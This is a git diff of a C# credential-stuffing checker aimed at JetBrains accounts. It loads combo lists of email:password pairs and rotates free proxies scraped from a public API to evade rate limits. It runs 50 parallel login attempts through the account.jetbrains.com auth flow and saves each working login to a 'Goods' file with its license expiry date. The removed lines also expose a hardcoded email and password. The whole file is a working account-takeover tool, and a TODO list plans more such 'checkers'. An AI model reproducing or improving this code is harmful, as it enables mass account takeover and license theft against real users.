@@ -1,8 +1,8 @@
 ﻿using System.Collections.Concurrent;
-using System.Globalization;
 using System.Net;
 using System.Text;
 using System.Text.Json;
+using Spectre.Console;
 
 namespace Jetbrains;
 
@@ -25,212 +25,350 @@ public struct PasswordLoginRequest
     public string password { get; set; }
 }
 
-class Program
+public static class Program
 {
+    private static string ProxyPath =
+        "C:\\Clion Projects\\jetbrains Refactored\\Proxy.txt";
+    private static string ComboPath =
+        "C:\\Clion Projects\\jetbrains Refactored\\Combo.txt";
+    private static string GoodAccountsPath =
+        "C:\\Clion Projects\\jetbrains Refactored\\Goods.txt";
+    private static string HttpProxyUrl =
+        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=10010";
+    
     private const string BaseUrl = "https://account.jetbrains.com";
-    private const string AuthEmail = "moisey_b@yahoo.com";
-    private const string AuthPassword = "psW_kmcv"; 
     
     private static int GoodAccouts = 0;
-    private static int BadAccounts = 0; 
-    
+    private static int BadAccounts = 0;
     static int TotalAccount = 0;
     static int TotalProxy = 0;
     
-    private static int ComboIndex = 0; 
+    private static int ComboIndex = 0;
     private static int ProxyIndex = 0;
     
     static ConcurrentQueue<string> AccountsQueue = new ConcurrentQueue<string>();
     static ConcurrentQueue<string> ProxiesQueue = new ConcurrentQueue<string>();
     
-    public static void Main(string[] args)
+    // we dont care about streamWriter not being thread-safe, the odds of
+    // multiple accounts being valid at the same time and being written
+    // to file using streamWriter is very low, right ?
+    private static StreamWriter streamWriter = new StreamWriter(GoodAccountsPath, true);
+    
+    private static int debug = 0;
+    private static string Type = "";
+    
+    public static async Task Main(string[] args)
     {
-        AccountLoader(out List<string> Accounts);     
+        //AnsiConsole.Markup("[underline red]Hello[/] World!");
+       
+        AccountLoader(out List<string> Accounts);
         TotalAccount = Accounts.Count;
         Console.WriteLine(TotalAccount + " Accounts Loaded");
         AccountsQueue = new ConcurrentQueue<string>(Accounts);
         
-        ProxyLoader(out List<string> Proxies);
-        TotalProxy = Proxies.Count;
-        Console.WriteLine(TotalProxy + " Accounts Loaded");
-        ProxiesQueue = new ConcurrentQueue<string>(Proxies); 
+        // ProxyLoader(out List<string> Proxies);
+        // TotalProxy = Proxies.Count;
+        // Console.WriteLine(TotalProxy + " Proxies Loaded");
+        // ProxiesQueue = new ConcurrentQueue<string>(Proxies);
         
-        int MaximumThreads = 10;
-        List<Task> tasks = new List<Task>();
-        for(int i = 1; i <= MaximumThreads; i++)
+        // loading proxies from proxyscrape for debug
+        string[] Proxies = await ProxyDownloader();
+        ProxiesQueue = new ConcurrentQueue<string>(Proxies);
+        Console.WriteLine("Total Proxy Loaded = " + Proxies.Count());
+        
+        Console.WriteLine("Proxy Type ? http, socks4, socks5");
+        Type = ProxyType();
+        if (Type != "http" && Type != "socks4" && Type != "socks5" && Type == null)
+        {
+            Console.WriteLine("Wrong Proxy Type, Choose between http, socks4, socsk5");
+            Console.WriteLine("closing the app in 5 seconds");
+            Thread.Sleep(5000);
+            return;
+        }
+        
+        int MaximumThreads = 50;
+        var tasks = new List<Task>();
+        for (int i = 1; i <= MaximumThreads; i++)
         {
             tasks.Add(Task.Run(() => HandleAccounts()));
         }
         Task.WaitAll(tasks.ToArray());
-         
+        
         Console.WriteLine(ComboIndex + " ---- " + ProxyIndex);
     }
-    // TODO
+    
     static async Task HandleAccounts()
     {
         string Email = "";
         string Password = "";
-        /*while (AccountsQueue.TryDequeue(out string Account) != false)
+        string proxy = "";
+        
+        while (ProxiesQueue.TryDequeue(out var Proxy) != false)
         {
-            string[] AccountSplit = Account.Split(":");
-            Email = AccountSplit[0];
-            Password = AccountSplit[1];
-            Interlocked.Increment(ref ComboIndex);
-        }*/
-         
-        string proxy = ""; 
-        while (ProxiesQueue.TryDequeue(out var Proxy) != false)    
-        {
-            Interlocked.Increment(ref ProxyIndex);
+            CancellationTokenSource cts = new CancellationTokenSource();
+            cts.CancelAfter(TimeSpan.FromSeconds(20));
+            
+            if (AccountsQueue.IsEmpty)
+            {
+                Console.WriteLine("Task " + Task.CurrentId + " Finished Checking");
+                break;
+            }
+            
             proxy = Proxy;
-            Console.WriteLine(ProxyIndex + "||" + Task.CurrentId + "||" + proxy);
+            // because we dont want to go out of proxies, we just keep rotating
+            ProxiesQueue.Enqueue(proxy);
+            
+            while (AccountsQueue.TryDequeue(out string Account) != false)
+            {
+                string[] LineSplit = Account.Split(":");
+                Email = LineSplit[0];
+                Password = LineSplit[1];
+                
+                // need to write a better error handler
+                try
+                {
+                    await HandleRequests(Email, Password, proxy, cts);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                    AccountsQueue.Enqueue(Account);
+                }
+                
+                int line = Interlocked.Increment(ref debug);
+                Console.WriteLine(
+                    "Tries = "
+                        + line
+                        + " || "
+                        + "Goods = "
+                        + GoodAccouts
+                        + " Bads = "
+                        + BadAccounts
+                );
+                break;
+            }
         }
-        // Console.WriteLine(Email + "---" + Password + "---" + proxy);
     }
     
-    static void AccountLoader(out List<string> Accounts) 
+    static void AccountLoader(out List<string> Accounts)
     {
         Accounts = new List<string>();
         string CurrentLine = "";
-        string ComboPath = "C:\\Clion Projects\\jetbrains Refactored\\Combo.txt";
-        StreamReader ComboReader= new StreamReader(ComboPath);
         
+        StreamReader ComboReader = new StreamReader(ComboPath);
         while ((CurrentLine = ComboReader.ReadLine()) != null)
         {
             Accounts.Add(CurrentLine);
         }
     }
     
-    static void ProxyLoader(out List<string> Proxies)    
+    // quick debug with Proxyscrape api
+    static async Task<string[]> ProxyDownloader()
+    {
+        Uri ProxyUrl = new Uri(HttpProxyUrl);
+        
+        HttpClient client = new HttpClient();
+        HttpResponseMessage response = await client.GetAsync(ProxyUrl);
+        string resp = await response.Content.ReadAsStringAsync();
+        
+        string[] proxies = resp.Split("\n");
+        return proxies;
+    }
+    
+    static void ProxyLoader(out List<string> Proxies)
     {
         Proxies = new List<string>();
         string CurrentLine = "";
-        string ProxyPath = "C:\\Clion Projects\\jetbrains Refactored\\Proxy.txt";
-        StreamReader ProxyReader = new StreamReader(ProxyPath); 
         
+        StreamReader ProxyReader = new StreamReader(ProxyPath);
         while ((CurrentLine = ProxyReader.ReadLine()) != null)
         {
             Proxies.Add(CurrentLine);
         }
     }
-    static async Task HandleAuthenticationFlow(string Email ,string Password ,string Proxy)
+    
+    static async Task HandleRequests(
+        string Email,
+        string Password,
+        string Proxy,
+        CancellationTokenSource cts
+    )
     {
-        using var client = CreateHttpClient(out var cookieContainer);
+        // TODO => need to handle different proxy types which is pretty easy
+        // string HttpProxy = "http://" + Proxy;
+        string ProxyFormat = Type + "://" + Proxy;
+        WebProxy webProxy = new WebProxy()
+        {
+            Address = new Uri(ProxyFormat),
+            UseDefaultCredentials = true,
+        };
         
-        // First get request to get JBA cookie
-        await client.GetStringAsync($"{BaseUrl}/login?reauthenticate=false");
+        using var client = CreateHttpClient(webProxy, out var cookieContainer);
+        
+        // Perform the first request to get JBA cookie
+        await client.GetStringAsync($"{BaseUrl}/login?reauthenticate=false", cts.Token);
         var authCookie = GetCookieByIndex(cookieContainer, 0);
-        
-        // Getting SessionID 
-        var sessionId = await CreateAuthSession(client, authCookie);
-        
-        // Email Request 
-        var emailResponse = await ExecuteEmailLogin(client, authCookie, sessionId);
+
+        // Getting SessionID
+        var sessionId = await CreateAuthSession(client, authCookie, cts.Token);
+
+        // Email Request
+        var emailResponse = await EmailLogin(
+            client,
+            Email,
+            authCookie,
+            sessionId,
+            cts.Token
+        );
         if (BadEmail(emailResponse) == true)
         {
-            BadAccounts++; 
+            Interlocked.Increment(ref BadAccounts);
             return;
-        } 
-        
-        // password Request 
-        var LoginResponse = await ExecutePasswordLogin(client, authCookie, sessionId);
-        if (BadPassword(LoginResponse) == true) 
+        }
+
+        // Password Request
+        var LoginResponse = await PasswordLogin(
+            client,
+            Email,
+            Password,
+            authCookie,
+            sessionId,
+            cts.Token
+        );
+
+        if (BadPassword(LoginResponse) == true)
         {
-            BadAccounts++;
+            Interlocked.Increment(ref BadAccounts);
             return;
-        } 
-        
-        // Account Info + Expiration Date => TODO
-        var AccountInfo = await CheckLicenseStatus(client, cookieContainer);
-        GoodAccouts++;
-        Console.WriteLine(AccountInfo);
+        }
+
+        // Account Info + Expiration Date => print and Save to file
+        var AccountInfo = await CheckLicenseStatus(
+            client,
+            Email,
+            Password,
+            cookieContainer,
+            cts.Token
+        );
+
+        Interlocked.Increment(ref GoodAccouts);
+        Console.WriteLine(AccountInfo + " || " + ProxyFormat);
     }
-    
-    static HttpClient CreateHttpClient(out CookieContainer cookieContainer)
+
+    static HttpClient CreateHttpClient(WebProxy proxy, out CookieContainer cookies)
     {
-        cookieContainer = new CookieContainer();
+        cookies = new CookieContainer();
         var handler = new HttpClientHandler
         {
+            UseProxy = true,
+            Proxy = proxy,
+
             UseCookies = true,
-            CookieContainer = cookieContainer
+            CookieContainer = cookies,
         };
         return new HttpClient(handler);
     }
-    
-    static async Task<string> CreateAuthSession(HttpClient client, Cookie authCookie)
+
+    static async Task<string> CreateAuthSession(
+        HttpClient client,
+        Cookie authCookie,
+        CancellationToken ctsToken
+    )
     {
-        var request = new HttpRequestMessage(HttpMethod.Post, $"{BaseUrl}/api/auth/sessions")
+        var request = new HttpRequestMessage(
+            HttpMethod.Post,
+            $"{BaseUrl}/api/auth/sessions"
+        )
         {
-            Content = new StringContent("", Encoding.UTF8, "application/json")
+            Content = new StringContent("", Encoding.UTF8, "application/json"),
         };
-        
         AddAuthHeaders(request, authCookie);
-        var response = await client.SendAsync(request);
+        var response = await client.SendAsync(request, ctsToken);
         return ParseSessionId(await response.Content.ReadAsStringAsync());
     }
-    
-    static async Task<string> ExecuteEmailLogin(HttpClient client, Cookie authCookie, string sessionId)
+
+    static async Task<string> EmailLogin(
+        HttpClient client,
+        string AuthEmail,
+        Cookie authCookie,
+        string sessionId,
+        CancellationToken ctsToken
+    )
     {
-        var emailRequest = new HttpRequestMessage(HttpMethod.Post,
-            $"{BaseUrl}/api/auth/sessions/{sessionId}/email/login")
+        var emailRequest = new HttpRequestMessage(
+            HttpMethod.Post,
+            $"{BaseUrl}/api/auth/sessions/{sessionId}/email/login"
+        )
         {
             Content = new StringContent(
-                JsonSerializer.Serialize(new EmailLoginRequest
-                {
-                    email = AuthEmail,
-                    shouldValidateEmail = false
-                }),
+                JsonSerializer.Serialize(
+                    new EmailLoginRequest
+                    {
+                        email = AuthEmail,
+                        shouldValidateEmail = false,
+                    }
+                ),
                 Encoding.UTF8,
-                "application/json")
+                "application/json"
+            ),
         };
-        
+
         AddAuthHeaders(emailRequest, authCookie);
-        var response = await client.SendAsync(emailRequest);
+        var response = await client.SendAsync(emailRequest, ctsToken);
         return await response.Content.ReadAsStringAsync();
     }
+
     static bool BadEmail(string emailResponse)
     {
-        if (emailResponse.Contains("We couldn't find") ||
-            emailResponse.Contains("InvalidEmail") ||
-            emailResponse.Contains("AccountNotFound"))
+        if (
+            emailResponse.Contains("We couldn't find")
+            || emailResponse.Contains("InvalidEmail")
+            || emailResponse.Contains("AccountNotFound")
+        )
         {
             Console.WriteLine("Bad Email");
             return true;
         }
-        {
-            Console.WriteLine("Bad Email");
-            return false;
-        }
+
+        return false;
     }
-    
-    static async Task<string> ExecutePasswordLogin(HttpClient client, Cookie authCookie, string sessionId)
+
+    static async Task<string> PasswordLogin(
+        HttpClient client,
+        string AuthEmail,
+        string AuthPassword,
+        Cookie authCookie,
+        string sessionId,
+        CancellationToken ctsToken
+    )
     {
-        var passwordRequest = new HttpRequestMessage(HttpMethod.Post,
-            $"{BaseUrl}/api/auth/sessions/{sessionId}/password")
+        var passwordRequest = new HttpRequestMessage(
+            HttpMethod.Post,
+            $"{BaseUrl}/api/auth/sessions/{sessionId}/password"
+        )
         {
             Content = new StringContent(
-                JsonSerializer.Serialize(new PasswordLoginRequest
-                {
-                    email = AuthEmail,
-                    password = AuthPassword,
-                    shouldValidateEmail = false
-                }),
+                JsonSerializer.Serialize(
+                    new PasswordLoginRequest
+                    {
+                        email = AuthEmail,
+                        password = AuthPassword,
+                        shouldValidateEmail = false,
+                    }
+                ),
                 Encoding.UTF8,
-                "application/json")
+                "application/json"
+            ),
         };
-        
         AddAuthHeaders(passwordRequest, authCookie);
-        var response = await client.SendAsync(passwordRequest);
+        var response = await client.SendAsync(passwordRequest, ctsToken);
         return await response.Content.ReadAsStringAsync();
     }
-    
+
     static bool BadPassword(string response)
     {
-        Console.WriteLine(response);
-        
         if (response.Contains("authenticated"))
         {
-            Console.WriteLine("Valid Account");
             return false;
         }
         else if (response.Contains("IncorrectPassword"))
@@ -244,54 +382,136 @@ class Program
             return true;
         }
     }
-    
-    static async Task<string> CheckLicenseStatus(HttpClient client, CookieContainer cookieContainer)
+
+    static async Task<string> CheckLicenseStatus(
+        HttpClient client,
+        string AuthEmail,
+        string AuthPassword,
+        CookieContainer cookieContainer,
+        CancellationToken ctsToken
+    )
     {
-        var licenseRequest = new HttpRequestMessage(HttpMethod.Get, $"{BaseUrl}/licenses");
+        var licenseRequest = new HttpRequestMessage(
+            HttpMethod.Get,
+            $"{BaseUrl}/licenses"
+        );
         licenseRequest.Headers.Add("Cookie", GetAllCookiesString(cookieContainer));
-        
-        var response = await client.SendAsync(licenseRequest);
+        var response = await client.SendAsync(licenseRequest, ctsToken);
         var body = await response.Content.ReadAsStringAsync();
-         
-        string date = ParseDateByPrefixSuffix(body,"<div class=\"well-label\">Billing date:</div>", "</span>");     
-        string AccountInfo = "Email = " + AuthEmail +  " || "+  "Password = "  + AuthPassword + " || Expiration Date = " + date;
+
+        string date = ParseDateByPrefixSuffix(
+            body,
+            "<div class=\"well-label\">Billing date:</div>",
+            "</span>"
+        );
+        string AccountInfo =
+            "Email = "
+            + AuthEmail
+            + " || "
+            + "Password = "
+            + AuthPassword
+            + " || Expiration Date = "
+            + date;
+
+        streamWriter.WriteLine(AccountInfo);
+        streamWriter.Flush();
+
         return AccountInfo;
     }
-    
+
     static string ParseDateByPrefixSuffix(string html, string prefix, string suffix)
     {
         int prefixIndex = html.IndexOf(prefix);
-        if (prefixIndex == -1) return null;
-        
-        int start = prefixIndex + prefix.Length +  74;
-        
+        if (prefixIndex == -1)
+            return null;
+
+        int start = prefixIndex + prefix.Length + 74;
         int suffixIndex = html.IndexOf(suffix, start);
-        if (suffixIndex == -1) return null;
-        
+        if (suffixIndex == -1)
+            return null;
+
         string Date = html.Substring(start, suffixIndex - start);
-        
-        return Date; 
+        return Date;
     }
-    
+
     static void AddAuthHeaders(HttpRequestMessage request, Cookie authCookie)
     {
         var cookieString = $"{authCookie.Name}={authCookie.Value}";
         request.Headers.Add("Cookie", cookieString);
         request.Headers.Add("X-XSRF-TOKEN", authCookie.Value);
     }
-    
+
     static string GetAllCookiesString(CookieContainer container)
     {
         return string.Join("; ", container.GetAllCookies().Cast<Cookie>());
     }
-    
+
     static Cookie GetCookieByIndex(CookieContainer container, int index)
     {
         return container.GetAllCookies().Cast<Cookie>().ElementAt(index);
     }
-    
+
     static string ParseSessionId(string responseBody)
     {
         return JsonSerializer.Deserialize<AuthSessionResponse>(responseBody).id;
     }
+
+    static string ProxyType()
+    {
+        string Type = Console.ReadLine();
+        if (Type == null)
+            Console.WriteLine("Proxy Type Not Specified");
+
+        return Type;
+    }
 }
+
+// TODO =>
+// 1 - Bot Input
+// 2 - Proxy Type Input
+// 3 - Console UI and Layout
+// 4 - generalize more stuff => so we dont have to write the next checker from scratch
+// 5 - Clean this shit up and remove unncessery stuff
+// 6 - https://spectreconsole.net/
+/*
+  
+        var Layout = new Layout("Main").SplitColumns(
+            new Layout("BruteStats"),
+            new Layout("ProxyStats")
+        );
+        
+        var BruteTable = new Table();
+        BruteTable.AddColumn(new TableColumn("Premium").Centered());
+        BruteTable.AddColumn(new TableColumn("Free").Centered());
+        BruteTable.AddColumn(new TableColumn("Bad").Centered());
+        
+        BruteTable.Expand();
+        BruteTable.Columns[0].Width(20);
+        BruteTable.Columns[1].Width(20);
+        BruteTable.Columns[2].Width(20);
+        
+        // Container for BruteTable
+        var BrutePanel = new Panel(BruteTable);
+        BrutePanel.Header("[bold yellow]Brute Stats [/]");
+        BrutePanel.Border(BoxBorder.Rounded);
+        BrutePanel.Expand();
+        
+        var ProxyTable = new Table();
+        ProxyTable.AddColumn(new TableColumn("Bad").Centered());
+        ProxyTable.AddColumn(new TableColumn("Retry").Centered());
+        ProxyTable.AddColumn(new TableColumn("Ban").Centered());
+        ProxyTable.Expand();
+        ProxyTable.Columns[0].Width(20);
+        ProxyTable.Columns[1].Width(20);
+        ProxyTable.Columns[2].Width(20);
+        
+        var ProxyPanel = new Panel(ProxyTable);
+        ProxyPanel.Header("[bold yellow]Proxy Stats [/]");
+        ProxyPanel.Border(BoxBorder.Rounded);
+        ProxyPanel.Expand();
+        
+        // this is where i update the Layout
+        Layout["BruteStats"].Update(BrutePanel);
+        Layout["ProxyStats"].Update(ProxyPanel);
+        AnsiConsole.Write(Layout);
+*/
